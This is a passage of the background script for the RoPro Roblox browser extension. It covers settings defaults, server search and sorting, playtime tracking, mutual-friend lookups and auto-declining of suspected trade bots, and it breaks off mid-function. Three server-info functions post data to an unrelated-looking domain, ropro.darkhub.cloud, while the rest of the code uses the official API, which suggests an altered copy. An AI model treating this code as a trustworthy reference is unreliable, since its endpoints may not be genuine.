/**

RoPro (https://ropro.io) v1.5

The RoPro extension is developed by:
                               
,------.  ,--. ,-----.,------. 
|  .-.  \ |  |'  .--./|  .---' 
|  |  \  :|  ||  |    |  `--,  
|  '--'  /|  |'  '--'\|  `---. 
`-------' `--' `-----'`------' 
                            
Contact me:

Discord - Dice#1000
Email - dice@ropro.io
Phone - 650-318-1631

Write RoPro:

RoPro Software Corporation
999 Peachtree Street NE
Suite 400
Atlanta, GA 30309
United States

RoPro Terms of Service:
https://ropro.io/terms

RoPro Privacy Policy:
https://ropro.io/privacy-policy

© 2022 RoPro Software Corporation
**/


var disabledFeatures = "";

$.post("https://api.ropro.io/disabledFeatures.php", function(data) {
		disabledFeatures = data
})

function getStorage(key) {
	return new Promise(resolve => {
		chrome.storage.sync.get(key, function (obj) {
			resolve(obj[key])
		})
	})
}

function setStorage(key, value) {
	return new Promise(resolve => {
		chrome.storage.sync.set({[key]: value}, function(){
			resolve()
		})
	})
}

function getLocalStorage(key) {
	return new Promise(resolve => {
		chrome.storage.local.get(key, function (obj) {
			resolve(obj[key])
		})
	})
}

function setLocalStorage(key, value) {
	return new Promise(resolve => {
		chrome.storage.local.set({[key]: value}, function(){
			resolve()
		})
	})
}

var defaultSettings = {
	buyButton: true,
	comments: true,
	dealCalculations: "rap",
	dealNotifier: true,
	embeddedRolimonsItemLink: true,
	embeddedRolimonsUserLink: true,
	fastestServersSort: true,
	gameLikeRatioFilter: true,
	gameTwitter: true,
	genreFilters: true,
	groupDiscord: true,
	groupRank: true,
	groupTwitter: true,
	featuredToys: true,
	itemPageValueDemand: true,
	linkedDiscord: true,
	liveLikeDislikeFavoriteCounters: true,
	livePlayers: true,
	liveVisits: true,
	roproVoiceServers: true,
	premiumVoiceServers: true,
	moreGameFilters: true,
	additionalServerInfo: true,
	moreServerFilters: true,
	serverInviteLinks: true,
	serverFilters: true,
	mostRecentServer: true,
	randomServer: true,
	tradeAge: true,
	notificationThreshold: 30,
	itemInfoCard: true,
	ownerHistory: true,
	profileThemes: true,
	globalThemes: true,
	lastOnline: true,
	roproEggCollection: true,
	profileValue: true,
	projectedWarningItemPage: true,
	quickItemSearch: true,
	quickTradeResellers: true,
	hideSerials: true,
	quickUserSearch: true,
	randomGame: true,
	popularToday: true,
	reputation: true,
	reputationVote: true,
	sandbox: true,
	sandboxOutfits: true,
	serverSizeSort: true,
	singleSessionMode: false,
	tradeDemandRatingCalculator: true,
	tradeItemDemand: true,
	tradeItemValue: true,
	tradeNotifier: true,
	tradeOffersPage: true,
	tradeOffersSection: true,
	tradeOffersValueCalculator: true,
	tradePageProjectedWarning: true,
	tradePreviews: true,
	tradeProtection: true,
	tradeValueCalculator: true,
	moreTradePanel: true,
	valueThreshold: 0,
	hideTradeBots: true,
	autoDeclineTradeBots: true,
	hideDeclinedNotifications: true,
	hideOutboundNotifications: false,
	tradePanel: true,
	quickDecline: true,
	quickCancel: true,
	roproIcon: true,
	underOverRAP: true,
	winLossDisplay: true,
	mostPlayedGames: true,
	mostPopularSort: true,
	experienceQuickSearch: true,
	experienceQuickPlay: true,
	avatarEditorChanges: true,
	playtimeTracking: true,
	activeServerCount: true,
	morePlaytimeSorts: true,
	roproBadge: true,
	mutualFriends: true,
	moreMutuals: true,
	animatedProfileThemes: true,
	cloudPlay: true,
	cloudPlayActive: false,
	hidePrivateServers: false,
	quickEquipItem: true,
	roproWishlist: true,
	themeColorAdjustments: true,
	tradeSearch: true,
	advancedTradeSearch: true
}

async function initializeSettings() {
	return new Promise(resolve => {
		async function checkSettings() {
			initialSettings = await getStorage('rpSettings')
			if (typeof initialSettings === "undefined") {
				await setStorage("rpSettings", defaultSettings)
				resolve()
			} else {
				changed = false
				for (key in Object.keys(defaultSettings)) {
					settingKey = Object.keys(defaultSettings)[key]
					if (!(settingKey in initialSettings)) {
						initialSettings[settingKey] = defaultSettings[settingKey]
						changed = true
					}
				}
				if (changed) {
					console.log("SETTINGS UPDATED")
					await setStorage("rpSettings", initialSettings)
				}
			}
			userVerification = await getStorage('userVerification')
			if (typeof userVerification === "undefined") {
				await setStorage("userVerification", {})
			}
			$.get('https://api.ropro.io/cloudPlayMetadata.php?cache', async function(data) {
				enabled = data['enabled'] ? true : false
				initialSettings['cloudPlay'] = enabled
				initialSettings['cloudPlayHidden'] = !enabled
				await setStorage("rpSettings", initialSettings)
			})
		}
		checkSettings()
	})
}
initializeSettings()

async function binarySearchServers(gameID, playerCount, maxLoops = 20) {
	async function getServerIndexPage(gameID, index) {
		return new Promise(resolve2 => {
			$.get("https://api.ropro.io/getServerCursor.php?startIndex=" + index + "&placeId=" + gameID, async function(data) {
				var cursor = data.cursor == null ? "" : data.cursor
				$.get("https://games.roblox.com/v1/games/" + gameID + "/servers/Public?cursor=" + cursor + "&sortOrder=Asc&limit=100", function(data) {
					resolve2(data)
				})
			})
		})
	}
	return new Promise(resolve => {
		var numLoops = 0
		$.get("https://api.ropro.io/getServerCursor.php?startIndex=0&placeId=" + gameID, async function(data) {
			var bounds = [parseInt(data.bounds[0] / 100), parseInt(data.bounds[1] / 100)]
			var index = null
			while(bounds[0] <= bounds[1] && numLoops < maxLoops) {
				mid = parseInt((bounds[0] + bounds[1]) / 2)
				var servers = await getServerIndexPage(gameID, mid * 100)
				await roproSleep(500)
				var minPlaying = -1
				if (servers.data.length > 0) {
					if (servers.data[0].playerTokens.length > playerCount) {
						bounds[1] = mid - 1
					} else if (servers.data[servers.data.length - 1].playerTokens.length < playerCount) {
						bounds[0] = mid + 1
					} else {
						index = mid
						break
					}
				} else {
					bounds[0] = mid + 1
				}
				numLoops++
			}
			if (index == null) {
				index = bounds[1]
			}
			resolve(index * 100)
		})
	})
}

async function maxPlayerCount(gameID, count) {
	return new Promise(resolve => {
		async function doMaxPlayerCount(gameID, count, resolve) {
			var index = await binarySearchServers(gameID, count, 20)
			$.get("https://api.ropro.io/getServerCursor.php?startIndex=" + index + "&placeId=" + gameID, async function(data) {
				var cursor = data.cursor == null ? "" : data.cursor
				var serverDict = {}
				var serverArray = []
				var numLoops = 0
				var done = false
				function getReversePage(cursor) {
					return new Promise(resolve2 => {
						$.get("https://games.roblox.com/v1/games/" + gameID + "/servers/Public?cursor=" + cursor + "&sortOrder=Asc&limit=100", function(data) {
							if (data.hasOwnProperty('data')) {
								for (var i = 0; i < data.data.length; i++) {
									serverDict[data.data[i].id] = data.data[i]
								}
							}
							resolve2(data)
						})
					})
				}
				while (!done && Object.keys(serverDict).length <= 150 && numLoops < 10) {
					var servers = await getReversePage(cursor)
					await roproSleep(500)
					if (servers.hasOwnProperty('previousPageCursor') && servers.previousPageCursor != null) {
						cursor = servers.previousPageCursor
					} else {
						done = true
					}
					numLoops++
				}
				keys = Object.keys(serverDict)
				for (var i = 0; i < keys.length; i++) {
					if (serverDict[keys[i]].hasOwnProperty('playing') && serverDict[keys[i]].playing <= count) {
						serverArray.push(serverDict[keys[i]])
					}
				}
				serverArray.sort(function(a, b){return b.playing - a.playing})
				console.log(serverArray)
				resolve(serverArray)
			})
		}
		doMaxPlayerCount(gameID, count, resolve)
	})
}

function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
}

async function serverFilterReverseOrder(gameID) {
	return new Promise(resolve => {
		async function doReverseOrder(gameID, resolve) {
			$.get("https://api.ropro.io/getServerCursor.php?startIndex=0&placeId=" + gameID, async function(data) {
				var cursor = data.cursor == null ? "" : data.cursor
				var serverDict = {}
				var serverArray = []
				var numLoops = 0
				var done = false
				function getReversePage(cursor) {
					return new Promise(resolve2 => {
						$.get("https://games.roblox.com/v1/games/" + gameID + "/servers/Public?cursor=" + cursor + "&sortOrder=Asc&limit=100", function(data) {
							if (data.hasOwnProperty('data')) {
								for (var i = 0; i < data.data.length; i++) {
									serverDict[data.data[i].id] = data.data[i]
								}
							}
							resolve2(data)
						})
					})
				}
				while (!done && Object.keys(serverDict).length <= 150 && numLoops < 20) {
					var servers = await getReversePage(cursor)
					await roproSleep(500)
					if (servers.hasOwnProperty('nextPageCursor') && servers.nextPageCursor != null) {
						cursor = servers.nextPageCursor
					} else {
						done = true
					}
					numLoops++
				}
				keys = Object.keys(serverDict)
				for (var i = 0; i < keys.length; i++) {
					if (serverDict[keys[i]].hasOwnProperty('playing')) {
						serverArray.push(serverDict[keys[i]])
					}
				}
				serverArray.sort(function(a, b){return a.playing - b.playing})
				resolve(serverArray)
			})
		}
		doReverseOrder(gameID, resolve)
	})
}

async function serverFilterRandomShuffle(gameID, minServers = 150) {
	return new Promise(resolve => {
		async function doRandomShuffle(gameID, resolve) {
			$.get("https://api.ropro.io/getServerCursor.php?startIndex=0&placeId=" + gameID, async function(data) {
				var indexArray = []
				var serverDict = {}
				var serverArray = []
				var done = false
				var numLoops = 0
				for (var i = data.bounds[0]; i <= data.bounds[1]; i = i + 100) {
					indexArray.push(i)
				}
				function getIndex() {
					return new Promise(resolve2 => {
						if (indexArray.length > 0) {
							var i = Math.floor(Math.random() * indexArray.length)
							var index = indexArray[i]
							indexArray.splice(i, 1)
							$.get("https://api.ropro.io/getServerCursor.php?startIndex=" + index + "&placeId=" + gameID, function(data) {
								var cursor = data.cursor
								if (cursor == null) {
									cursor = ""
								}
								$.get("https://games.roblox.com/v1/games/" + gameID + "/servers/Public?cursor=" + cursor + "&sortOrder=Asc&limit=100", function(data) {
									if (data.hasOwnProperty('data')) {
										for (var i = 0; i < data.data.length; i++) {
											if (data.data[i].hasOwnProperty('playing') && data.data[i].playing < data.data[i].maxPlayers) {
												serverDict[data.data[i].id] = data.data[i]
											}
										}
									}
									resolve2()
								}).fail(function() {
									done = true
									resolve2()
								})
							})
						} else {
							done = true
							resolve2()
						}
					})
				}
				while (!done && Object.keys(serverDict).length <= minServers && numLoops < 20) {
					await getIndex()
					await roproSleep(500)
					numLoops++
				}
				keys = Object.keys(serverDict)
				for (var i = 0; i < keys.length; i++) {
					serverArray.push(serverDict[keys[i]])
				}
				resolve(serverArray)
			})
		}
		doRandomShuffle(gameID, resolve)
	})
}

async function fetchServerInfo(placeID, servers) {
	return new Promise(resolve => {
		$.post({url:"https://ropro.darkhub.cloud/getServerInfo.php///api", data: {'placeID':placeID, 'servers': servers}}, 
			function(data) {
				resolve(data)
			}
		)
	})
}

async function fetchServerConnectionScore(placeID, servers) {
	return new Promise(resolve => {
		$.post({url:"https://ropro.darkhub.cloud/getServerConnectionScore.php///api", data: {'placeID':placeID, 'servers': servers}}, 
			function(data) {
				resolve(data)
			}
		)
	})
}

async function fetchServerAge(placeID, servers) {
	return new Promise(resolve => {
		$.post({url:"https://ropro.darkhub.cloud/getServerAge.php///api", data: {'placeID':placeID, 'servers': servers}}, 
			function(data) {
				resolve(data)
			}
		)
	})
}

async function serverFilterRegion(gameID, location) {
	return new Promise(resolve => {
		async function doServerFilterRegion(gameID, resolve) {
			var serverArray = await serverFilterRandomShuffle(gameID, 250)
			var serverList = []
			var serverSet = {}
			shuffleArray(serverArray)
			async function checkLocations(serverArray) {
				var serversDict = {}
				for (var i = 0; i < serverArray.length; i++) {
					serversDict[serverArray[i].id] = serverArray[i]
				}
				serverInfo = await fetchServerInfo(gameID, Object.keys(serversDict))
				for (var i = 0; i < serverInfo.length; i++) {
					if (serverInfo[i].location == location && !(serverInfo[i].server in serverSet)) {
						serverList.push(serversDict[serverInfo[i].server])
						serverSet[serverInfo[i].server] = true
					}
				}
				console.log(serverList)
				resolve(serverList)	
			}
			checkLocations(serverArray)
		}
		doServerFilterRegion(gameID, resolve)
	})
}

async function serverFilterBestConnection(gameID) {
	return new Promise(resolve => {
		async function doServerFilterBestConnection(gameID, resolve) {
			var serverArray = await serverFilterRandomShuffle(gameID, 250)
			var serverList = []
			var serverSet = {}
			shuffleArray(serverArray)
			async function checkLocations(serverArray) {
				var serversDict = {}
				for (var i = 0; i < serverArray.length; i++) {
					serversDict[serverArray[i].id] = serverArray[i]
				}
				serverInfo = await fetchServerConnectionScore(gameID, Object.keys(serversDict))
				for (var i = 0; i < serverInfo.length; i++) {
					serversDict[serverInfo[i].server]['score'] = serverInfo[i].score
					serverList.push(serversDict[serverInfo[i].server])
				}
				serverList = serverList.sort(function(a, b) {
					return ((a['score'] < b['score']) ? -1 : ((a['score'] > b['score']) ? 1 : 0));
				})
				resolve(serverList)
			}
			checkLocations(serverArray)
		}
		doServerFilterBestConnection(gameID, resolve)
	})
}

async function serverFilterNewestServers(gameID) {
	return new Promise(resolve => {
		async function doServerFilterNewestServers(gameID, resolve) {
			var serverArray = await serverFilterRandomShuffle(gameID, 250)
			var serverList = []
			var serverSet = {}
			shuffleArray(serverArray)
			async function checkAge(serverArray) {
				var serversDict = {}
				for (var i = 0; i < serverArray.length; i++) {
					serversDict[serverArray[i].id] = serverArray[i]
				}
				serverInfo = await fetchServerAge(gameID, Object.keys(serversDict))
				for (var i = 0; i < serverInfo.length; i++) {
					serversDict[serverInfo[i].server]['age'] = serverInfo[i].age
					serverList.push(serversDict[serverInfo[i].server])
				}
				serverList = serverList.sort(function(a, b) {
					return ((a['age'] < b['age']) ? -1 : ((a['age'] > b['age']) ? 1 : 0));
				})
				resolve(serverList)
			}
			checkAge(serverArray)
		}
		doServerFilterNewestServers(gameID, resolve)
	})
}

async function serverFilterOldestServers(gameID) {
	return new Promise(resolve => {
		async function doServerFilterOldestServers(gameID, resolve) {
			var serverArray = await serverFilterRandomShuffle(gameID, 250)
			var serverList = []
			var serverSet = {}
			shuffleArray(serverArray)
			async function checkAge(serverArray) {
				var serversDict = {}
				for (var i = 0; i < serverArray.length; i++) {
					serversDict[serverArray[i].id] = serverArray[i]
				}
				serverInfo = await fetchServerAge(gameID, Object.keys(serversDict))
				for (var i = 0; i < serverInfo.length; i++) {
					serversDict[serverInfo[i].server]['age'] = serverInfo[i].age
					serverList.push(serversDict[serverInfo[i].server])
				}
				serverList = serverList.sort(function(a, b) {
					return ((a['age'] < b['age']) ? 1 : ((a['age'] > b['age']) ? -1 : 0));
				})
				resolve(serverList)
			}
			checkAge(serverArray)
		}
		doServerFilterOldestServers(gameID, resolve)
	})
}

async function roproSleep(ms) {
	return new Promise(resolve => {
		setTimeout(function() {
			resolve()
		}, ms)
	})
}

async function getServerPage(gameID, cursor) {
	return new Promise(resolve => {
		$.get('https://games.roblox.com/v1/games/' + gameID + '/servers/Public?limit=100&cursor=' + cursor, async function(data, error, response) {
			resolve(data)
		}).fail(function() {
			resolve({})
		})
	})
}

async function randomServer(gameID) {
	return new Promise(resolve => {
		$.get('https://games.roblox.com/v1/games/' + gameID + '/servers/Friend?limit=100', async function(data) {
			friendServers = []
			for (i = 0; i < data.data.length; i++) {
				friendServers.push(data.data[i]['id'])
			}
			var serverList = new Set()
			var done = false
			var numLoops = 0
			var cursor = ""
			while (!done && serverList.size < 150 && numLoops < 5) {
				var serverPage = await getServerPage(gameID, cursor)
				await roproSleep(500)
				if (serverPage.hasOwnProperty('data')) {
					for (var i = 0; i < serverPage.data.length; i++) {
						server = serverPage.data[i]
						if (!friendServers.includes(server.id) && server.playing < server.maxPlayers) {
							serverList.add(server)
						}
					}
				}
				if (serverPage.hasOwnProperty('nextPageCursor')) {
					cursor = serverPage.nextPageCursor
					if (cursor == null) {
						done = true
					}
				} else {
					done = true
				}
				numLoops++
			}
			if (!done && serverList.size == 0) { //No servers found via linear cursoring but end of server list not reached, try randomly selecting servers.
				console.log("No servers found via linear cursoring but end of server list not reached, lets try randomly selecting servers.")
				var servers = await serverFilterRandomShuffle(gameID, 50)
				for (var i = 0; i < servers.length; i++) {
					server = servers[i]
					if (!friendServers.includes(server.id) && server.playing < server.maxPlayers) {
						serverList.add(server)
					}
				}
			}
			serverList = Array.from(serverList)
			if (serverList.length > 0) {
				resolve(serverList[Math.floor(Math.random() * serverList.length)])
			} else {
				resolve(null)
			}
		})
	})
}

async function getTimePlayed() {
	playtimeTracking = await loadSettings("playtimeTracking")
	mostRecentServer = true
	if (playtimeTracking || mostRecentServer) {
		userID = await getStorage("rpUserID");
		if (playtimeTracking) {
			timePlayed = await getLocalStorage("timePlayed")
			if (typeof timePlayed == 'undefined') {
				timePlayed = {}
				setLocalStorage("timePlayed", timePlayed)
			}
		}
		if (mostRecentServer) {
			mostRecentServers = await getLocalStorage("mostRecentServers")
			if (typeof mostRecentServers == 'undefined') {
				mostRecentServers = {}
				setLocalStorage("mostRecentServers", mostRecentServers)
			}
		}
		$.ajax({
			url: "https://presence.roblox.com/v1/presence/users",
			type: "POST",
			data: {
				"userIds": [
				userID
				]
			},
			success: async function(data) {
				placeId = data.userPresences[0].placeId
				universeId = data.userPresences[0].universeId
				if (placeId != null && universeId != null && data.userPresences[0].userPresenceType != 3) {
					if (playtimeTracking) {
						if (universeId in timePlayed) {
							timePlayed[universeId] = [timePlayed[universeId][0] + 1, new Date().getTime(), true]
						} else {
							timePlayed[universeId] = [1, new Date().getTime(), true]
						}
						if (timePlayed[universeId][0] >= 30) {
							timePlayed[universeId] = [0, new Date().getTime(), true]
							verificationDict = await getStorage('userVerification')
							userID = await getStorage('rpUserID')
							roproVerificationToken = "none"
							if (typeof verificationDict != 'undefined') {
								if (verificationDict.hasOwnProperty(userID)) {
									roproVerificationToken = verificationDict[userID]
								}
							}
							$.ajax({
								url: "https://api.ropro.io/postTimePlayed.php?gameid=" + placeId + "&universeid=" + universeId,
								type: "POST",
								headers: {'ropro-verification': roproVerificationToken, 'ropro-id': userID}
							})
						}
						setLocalStorage("timePlayed", timePlayed)
					}
					if (mostRecentServer) {
						gameId = data.userPresences[0].gameId
						if (gameId != null) {
							mostRecentServers[universeId] = [placeId, gameId, userID, new Date().getTime()]
							setLocalStorage("mostRecentServers", mostRecentServers)
						}
					}
				}
			}
		})
	}
}

setInterval(getTimePlayed, 60000)

var cloudPlayTab = null

async function launchCloudPlayTab(placeID, serverID = null, accessCode = null) {
	if (cloudPlayTab == null) {
		chrome.tabs.create({
			url: `https://now.gg/play/roblox-corporation/5349/roblox?utm_source=extension&utm_medium=browser&utm_campaign=ropro&deep_link=robloxmobile%3A%2F%2FplaceID%3D${parseInt(placeID)}${serverID == null ? '' : '%26gameInstanceId%3D' + serverID}${accessCode == null ? '' : '%26accessCode%3D' + accessCode}`
		}, function(tab) {
			cloudPlayTab = tab.id
		})
	} else {
		chrome.tabs.get(cloudPlayTab, function(tab) {
			if (!tab) {
				chrome.tabs.create({
					url: `https://now.gg/play/roblox-corporation/5349/roblox?utm_source=extension&utm_medium=browser&utm_campaign=ropro&deep_link=robloxmobile%3A%2F%2FplaceID%3D${parseInt(placeID)}${serverID == null ? '' : '%26gameInstanceId%3D' + serverID}${accessCode == null ? '' : '%26accessCode%3D' + accessCode}`
				}, function(tab) {
					cloudPlayTab = tab.id
				})
			} else {
				chrome.tabs.update(tab.id, {
					active: true,
					url: `https://now.gg/play/roblox-corporation/5349/roblox?utm_source=extension&utm_medium=browser&utm_campaign=ropro&deep_link=robloxmobile%3A%2F%2FplaceID%3D${parseInt(placeID)}${serverID == null ? '' : '%26gameInstanceId%3D' + serverID}${accessCode == null ? '' : '%26accessCode%3D' + accessCode}`
				})
			}
		})
	}
}

function range(start, end) {
    var foo = [];
    for (var i = start; i <= end; i++) {
        foo.push(i);
    }
    return foo;
}

function stripTags(s) {
	if (typeof s == "undefined") {
		return s
	}
	return s.replace(/(<([^>]+)>)/gi, "").replace(/</g, "").replace(/>/g, "").replace(/'/g, "").replace(/"/g, "").replace(/`/g, "");
 }

async function mutualFriends(userId) {
	return new Promise(resolve => {
		async function doGet() {
			myId = await getStorage("rpUserID")
			friendCache = await getLocalStorage("friendCache")
			console.log(friendCache)
			if (typeof friendCache == "undefined" || new Date().getTime() - friendCache["expiration"] > 300000) {
				$.get('https://friends.roblox.com/v1/users/' + myId + '/friends', function(myFriends){
					setLocalStorage("friendCache", {"friends": myFriends, "expiration": new Date().getTime()})
					$.get('https://friends.roblox.com/v1/users/' + userId + '/friends', async function(theirFriends){
						friends = {}
						for (i = 0; i < myFriends.data.length; i++) {
							friend = myFriends.data[i]
							friends[friend.id] = friend
						}
						mutuals = []
						for (i = 0; i < theirFriends.data.length; i++) {
							friend = theirFriends.data[i]
							if (friend.id in friends) {
								mutuals.push({"name": stripTags(friend.name), "link": "/users/" + parseInt(friend.id) + "/profile", "icon": "https://www.roblox.com/headshot-thumbnail/image?userId=" + parseInt(friend.id) + "&width=420&height=420&format=png", "additional": friend.isOnline ? "Online" : "Offline"})
							}
						}
						console.log("Mutual Friends:", mutuals)
						resolve(mutuals)
					})
				})
			} else {
				myFriends = friendCache["friends"]
				console.log("cached")
				console.log(friendCache)
					$.get('https://friends.roblox.com/v1/users/' + userId + '/friends', function(theirFriends){
						friends = {}
						for (i = 0; i < myFriends.data.length; i++) {
							friend = myFriends.data[i]
							friends[friend.id] = friend
						}
						mutuals = []
						for (i = 0; i < theirFriends.data.length; i++) {
							friend = theirFriends.data[i]
							if (friend.id in friends) {
								mutuals.push({"name": stripTags(friend.name), "link": "/users/" + parseInt(friend.id) + "/profile", "icon": "https://www.roblox.com/headshot-thumbnail/image?userId=" + parseInt(friend.id) + "&width=420&height=420&format=png", "additional": friend.isOnline ? "Online" : "Offline"})
							}
						}
						console.log("Mutual Friends:", mutuals)
						resolve(mutuals)
					})
			}
		}
		doGet()
	})
}

async function mutualFollowing(userId) {
	return new Promise(resolve => {
		async function doGet() {
			myId = await getStorage("rpUserID")
				$.get('https://friends.roblox.com/v1/users/' + myId + '/followings?sortOrder=Desc&limit=100', function(myFriends){
					$.get('https://friends.roblox.com/v1/users/' + userId + '/followings?sortOrder=Desc&limit=100', function(theirFriends){
						friends = {}
						for (i = 0; i < myFriends.data.length; i++) {
							friend = myFriends.data[i]
							friends[friend.id] = friend
						}
						mutuals = []
						for (i = 0; i < theirFriends.data.length; i++) {
							friend = theirFriends.data[i]
							if (friend.id in friends) {
								mutuals.push({"name": stripTags(friend.name), "link": "/users/" + parseInt(friend.id) + "/profile", "icon": "https://www.roblox.com/headshot-thumbnail/image?userId=" + parseInt(friend.id) + "&width=420&height=420&format=png", "additional": friend.isOnline ? "Online" : "Offline"})
							}
						}
						console.log("Mutual Following:", mutuals)
						resolve(mutuals)
					})
				})
		}
		doGet()
	})
}


async function mutualFollowers(userId) {
	return new Promise(resolve => {
		async function doGet() {
			myId = await getStorage("rpUserID")
				$.get('https://friends.roblox.com/v1/users/' + myId + '/followers?sortOrder=Desc&limit=100', function(myFriends){
					$.get('https://friends.roblox.com/v1/users/' + userId + '/followers?sortOrder=Desc&limit=100', function(theirFriends){
						friends = {}
						for (i = 0; i < myFriends.data.length; i++) {
							friend = myFriends.data[i]
							friends[friend.id] = friend
						}
						mutuals = []
						for (i = 0; i < theirFriends.data.length; i++) {
							friend = theirFriends.data[i]
							if (friend.id in friends) {
								mutuals.push({"name": stripTags(friend.name), "link": "/users/" + parseInt(friend.id) + "/profile", "icon": "https://www.roblox.com/headshot-thumbnail/image?userId=" + parseInt(friend.id) + "&width=420&height=420&format=png", "additional": friend.isOnline ? "Online" : "Offline"})
							}
						}
						console.log("Mutual Followers:", mutuals)
						resolve(mutuals)
					})
				})
		}
		doGet()
	})
}

async function mutualFavorites(userId, assetType) {
	return new Promise(resolve => {
		async function doGet() {
			myId = await getStorage("rpUserID")
			$.get('https://www.roblox.com/users/favorites/list-json?assetTypeId=' + assetType + '&itemsPerPage=10000&pageNumber=1&userId=' + myId, function(myFavorites){
				$.get('https://www.roblox.com/users/favorites/list-json?assetTypeId=' + assetType + '&itemsPerPage=10000&pageNumber=1&userId=' + userId, function(theirFavorites){
					favorites = {}
					for (i = 0; i < myFavorites.Data.Items.length; i++) {
						favorite = myFavorites.Data.Items[i]
						favorites[favorite.Item.AssetId] = favorite
					}
					mutuals = []
					for (i = 0; i < theirFavorites.Data.Items.length; i++) {
						favorite = theirFavorites.Data.Items[i]
						if (favorite.Item.AssetId in favorites) {
							mutuals.push({"name": stripTags(favorite.Item.Name), "link": stripTags(favorite.Item.AbsoluteUrl), "icon": favorite.Thumbnail.Url, "additional": "By " + stripTags(favorite.Creator.Name)})
						}
					}
					console.log("Mutual Favorites:", mutuals)
					resolve(mutuals)
				})
			})
		}
		doGet()
	})
}

async function mutualGroups(userId) {
	return new Promise(resolve => {
		async function doGet() {
			myId = await getStorage("rpUserID")
			d = {}
			$.get('https://groups.roblox.com/v1/users/' + myId + '/groups/roles', function(groups) {
				for (i = 0; i < groups.data.length; i++) {
					d[groups.data[i].group.id] = true
				}
				mutualsJSON = []
				mutuals = []
				$.get('https://groups.roblox.com/v1/users/' + userId + '/groups/roles', function(groups) {
					for (i = 0; i < groups.data.length; i++) {
						if (groups.data[i].group.id in d) {
							mutualsJSON.push({"groupId": groups.data[i].group.id})
							mutuals.push({"id": groups.data[i].group.id, "name": stripTags(groups.data[i].group.name), "link": stripTags("https://www.roblox.com/groups/" + groups.data[i].group.id + "/group"), "icon": "https://t0.rbxcdn.com/75c8a07ec89b142d63d9b8d91be23b26", "additional": groups.data[i].group.memberCount + " Members"})
						}
					}
					$.get('https://www.roblox.com/group-thumbnails?params=' + JSON.stringify(mutualsJSON), function(data) { 
						for (i = 0; i < data.length; i++) {
							d[data[i].id] = data[i].thumbnailUrl
						}
						for (i = 0; i < mutuals.length; i++) {
							mutuals[i].icon = d[mutuals[i].id]
						}
						console.log("Mutual Groups:", mutuals)
						resolve(mutuals)
					})
				})
			})
		}
		doGet()
	})
}

async function mutualItems(userId) {
	return new Promise(resolve => {
		async function doGet() {
			myId = await getStorage("rpUserID")
			myItems = await loadItems(myId, "Hat,Face,Gear,Package,HairAccessory,FaceAccessory,NeckAccessory,ShoulderAccessory,FrontAccessory,BackAccessory,WaistAccessory,Shirt,Pants")
			try {
				theirItems = await loadItems(userId, "Hat,Face,Gear,Package,HairAccessory,FaceAccessory,NeckAccessory,ShoulderAccessory,FrontAccessory,BackAccessory,WaistAccessory,Shirt,Pants")
			} catch(err) {
				resolve([{"error": true}])
			}
			mutuals = []
			for (let item in theirItems) {
				if (item in myItems) {
					mutuals.push({"name": stripTags(myItems[item].name), "link": stripTags("https://www.roblox.com/catalog/" + myItems[item].assetId), "icon": "https://api.ropro.io/getAssetThumbnail.php?id=" + myItems[item].assetId, "additional": ""})
				}
			}
			console.log("Mutual Items:", mutuals)
			resolve(mutuals)
		}
		doGet()
	})
}

async function mutualLimiteds(userId) {
	return new Promise(resolve => {
		async function doGet() {
			myId = await getStorage("rpUserID")
			myLimiteds = await loadInventory(myId)
			try {
				theirLimiteds = await loadInventory(userId)
			} catch(err) {
				resolve([{"error": true}])
			}
			mutuals = []
			for (let item in theirLimiteds) {
				if (item in myLimiteds) {
					mutuals.push({"name": stripTags(myLimiteds[item].name), "link": stripTags("https://www.roblox.com/catalog/" + myLimiteds[item].assetId), "icon": "https://api.ropro.io/getAssetThumbnail.php?id=" + myLimiteds[item].assetId, "additional": "Quantity: " + parseInt(theirLimiteds[item].quantity)})
				}
			}
			console.log("Mutual Limiteds:", mutuals)
			resolve(mutuals)
		}
		doGet()
	})
}


async function getPage(userID, assetType, cursor) {
	return new Promise(resolve => {
		function getPage(resolve, userID, cursor, assetType) {
			$.get(`https://inventory.roblox.com/v1/users/${userID}/assets/collectibles?cursor=${cursor}&limit=50&sortOrder=Desc${assetType == null ? '' : '&assetType=' + assetType}`, function(data) {
				resolve(data)
			}).fail(function(r, e, s){
				if (r.status == 429) {
					setTimeout(function(){
						getPage(resolve, userID, cursor, assetType)
					}, 21000)
				} else {
					resolve({"previousPageCursor":null,"nextPageCursor":null,"data":[]})
				}
			})
		}
		getPage(resolve, userID, cursor, assetType)
	})
}

async function getInventoryPage(userID, assetTypes, cursor) {
	return new Promise(resolve => {
		$.get('https://inventory.roblox.com/v2/users/' + userID + '/inventory?assetTypes=' + assetTypes + '&limit=100&sortOrder=Desc&cursor=' + cursor, function(data) {
			resolve(data)
		}).fail(function(){
			resolve({})
		})
	})
}

async function declineBots() { //Code to decline all suspected trade botters
	return new Promise(resolve => {
		var tempCursor = ""
		var botTrades = []
		var totalLoops = 0
		var totalDeclined = 0
		async function doDecline() {
			trades = await fetchTradesCursor("inbound", 100, tempCursor)
			tempCursor = trades.nextPageCursor
			tradeIds = []
			userIds = []
			for (i = 0; i < trades.data.length; i++) {
				tradeIds.push([trades.data[i].user.id, trades.data[i].id])
				userIds.push(trades.data[i].user.id)
			}
			if (userIds.length > 0) {
				flags = await fetchFlagsBatch(userIds)
				flags = JSON.parse(flags)
				for (i = 0; i < tradeIds.length; i++) {
					try{
						if (flags.includes(tradeIds[i][0].toString())) {
							botTrades.push(tradeIds[i][1])
						}
					} catch (e) {
						console.log(e)
					}
				}
			}
			if (totalLoops < 20 && tempCursor != null) {
				setTimeout(function(){
					doDecline()
					totalLoops += 1
				}, 100)
			} else {
				if (botTrades.length > 0) {
					await loadToken()
					token = await getStorage("token")
					for (i = 0; i < botTrades.length; i++) {
						console.log(i, botTrades.length)
						try {
							if (totalDeclined < 300) {
								await cancelTrade(botTrades[i], token)
								totalDeclined = totalDeclined + 1
							} else {
								resolve(totalDeclined)
							}
						} catch(e) {
							resolve(totalDeclined)
						}
					}
				}
				console.log("Declined " + botTrades.length + " trades!")
				resolve(botTrades.length)
			}
		}
		doDecline()
	})
}

async function fetchFlagsBatch(userIds) {
	return new Promise(resolve => {
		$.post("https://api.ropro.io/fetchFlags.php?ids=" + userIds.join(","), function(data){ 
			resolve(data)
		})
	})
}

function createNotification(notificationId, options) {
	return new Promise(resolve => {
		chrome.notifications.create(notificationId, options, function() {
			resolve()
		})
	})	
}

async function loadItems(userID, assetTypes) {
	myInventory = {}
	async function handleAsset(cursor) {
